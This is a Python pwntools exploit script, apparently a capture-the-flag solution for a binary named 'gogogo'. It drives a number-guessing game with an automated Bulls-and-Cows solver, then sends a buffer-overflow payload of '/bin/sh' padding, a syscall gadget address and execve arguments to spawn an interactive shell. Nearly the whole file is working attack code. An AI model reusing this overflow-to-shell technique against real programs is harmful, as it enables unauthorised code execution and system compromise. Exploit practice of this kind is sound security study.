# coding=utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p=process("./gogogo")

def guessTrainner():
   start =time.time()
   answerSet=answerSetInit(set())
#    print answerSet
   for i in range(6):
      inputStrMax=suggestedNum(answerSet,100)
      print('第%d步----' %(i+1))
      print('尝试：' +inputStrMax)
      print('----')
      AMax,BMax = compareAnswer(inputStrMax)
      print('反馈：%dA%dB' % (AMax, BMax))
      print('----')
      print('排除可能答案：%d个' % (answerSetDelNum(answerSet,inputStrMax,AMax,BMax)))
      answerSetUpd(answerSet,inputStrMax,AMax,BMax)
      if AMax==4:
         elapsed = (time.time() - start)
         print("猜数字成功，总用时：%f秒，总步数：%d。" %(elapsed,i+1))
         break
      elif i==5:
         print("猜数字失败！")
 
 
def compareAnswer(inputStr):
    inputStr1 = inputStr[0]+' '+inputStr[1]+' '+inputStr[2]+' '+inputStr[3]
    p.sendline(inputStr1)
    ru('\n')
    tmp = p.recvuntil('B',timeout=0.5)
    # print(tmp)
    if tmp == '':
        return 4,4
    tmp = tmp.split("A")
    A = tmp[0]
    B = tmp[1].split('B')[0]
    return int(A),int(B)
 
def compareAnswer1(inputStr,answerStr):
   A=0
   B=0
   for j in range(4):
      if inputStr[j]==answerStr[j]:
         A+=1
      else:
         for k in range(4):
            if inputStr[j]==answerStr[k]:
               B+=1
   return A,B
   
def answerSetInit(answerSet):
	answerSet.clear()
	for i in range(1234,9877):
		seti=set(str(i))
		print seti
		if len(seti)==4 and seti.isdisjoint(set('0')):
			answerSet.add(str(i))
	return answerSet
 
def answerSetUpd(answerSet,inputStr,A,B):
   answerSetCopy=answerSet.copy()
   for answerStr in answerSetCopy:
      A1,B1=compareAnswer1(inputStr,answerStr)
      if A!=A1 or B!=B1:
         answerSet.remove(answerStr)
 
def answerSetDelNum(answerSet,inputStr,A,B):
   i=0
   for answerStr in answerSet:
      A1, B1 = compareAnswer1(inputStr, answerStr)
      if A!=A1 or B!=B1:
         i+=1
   return i
 
 
def suggestedNum(answerSet,lvl):
   suggestedNum=''
   delCountMax=0
   if len(answerSet) > lvl:
      suggestedNum = list(answerSet)[0]
   else:
      for inputStr in answerSet:
         delCount = 0
         for answerStr in answerSet:
            A,B = compareAnswer1(inputStr, answerStr)
            delCount += answerSetDelNum(answerSet, inputStr,A,B)
         if delCount > delCountMax:
            delCountMax = delCount
            suggestedNum = inputStr
         if delCount == delCountMax:
            if suggestedNum == '' or int(suggestedNum) > int(inputStr):
               suggestedNum = inputStr
 
   return suggestedNum
 
 
ru("PLEASE INPUT A NUMBER:")
p.sendline("1717986918")
ru("PLEASE INPUT A NUMBER:")
p.sendline("1234") 
# gdb.attach(p)
# p.sendline("305419896")
# p.interactive()
# p.interactive()
ru("YOU HAVE SEVEN CHANCES TO GUESS")
guessTrainner()
sa("AGAIN OR EXIT?","exit")
gdb.attach(p)
sla("(4) EXIT","4")
syscall = 0x47CF05
# syscall = 0x000000000042c066
binsh = 0xc0000be000

payload = '/bin/sh\x00'*0x8c + p64(syscall) + p64(0) + p64(59) + p64(binsh) + p64(0) + p64(0)
 
sla("ARE YOU SURE?",payload)
p.interactive()
 
